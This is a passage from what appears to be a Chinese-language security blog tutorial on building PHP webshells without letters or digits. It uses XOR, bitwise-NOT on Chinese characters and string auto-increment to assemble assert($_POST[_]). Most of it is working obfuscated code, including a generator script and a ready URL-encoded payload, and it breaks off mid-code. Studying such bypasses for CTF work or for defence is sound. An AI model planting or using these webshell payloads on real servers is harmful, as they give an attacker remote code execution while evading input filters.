<span class="built_in">print</span>(<span class="string">&#x27;(&quot;&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;&quot;^&quot;&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;&quot;)==&#x27;</span>+<span class="built_in">chr</span>(result)+<span class="string">&#x27;   chr(&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)^chr(&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;)==&#x27;</span>+<span class="built_in">chr</span>(result))</span><br></pre></td></tr></table></figure><p>举例代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">P:<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; O:<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span> ; S:<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span></span><br><span class="line">拼接起来：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);  <span class="comment">// $_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);  <span class="comment">// $__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312082234353.png"></p><h4 id="第二种-取反"><a href="#第二种-取反" class="headerlink" title="第二种 取反"></a>第二种 取反</h4><p>这个取反和上面的取反不同 使用UTF-8 提取汉字 取反</p><p>先附上脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> ); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure><p>上面脚本运行后 assert 的UTF-8汉字是 <strong>极区区皮十勺</strong> 在和{1}进行取反就能assert 具体原理不是很懂</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>++;   <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;   <span class="comment">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//assert($_POST[_])</span></span><br></pre></td></tr></table></figure><p>由于不可见原因在进行URL编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%24_%2B%2B%3B%24__%20%3D%20%22%E6%9E%81%22%3B%24___%20%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8C%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%9A%AE%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8D%81%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8B%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24____%20%3D%20&#x27;_&#x27;%3B%24__%20%3D%20%22%E5%AF%B8%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%B0%8F%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E6%AC%A0%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%AB%8B%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24_%20%3D%20%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312082346154.png"></p><p>来自大佬的实验结果</p><h4 id="3-自增绕过"><a href="#3-自增绕过" class="headerlink" title="3.自增绕过"></a>3.自增绕过</h4><p>列如a++; 自增后就变成了b .如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”。 然后取第一个值就可以遍历所有的字母。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312092033219.png"></p><p>大佬构造的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span 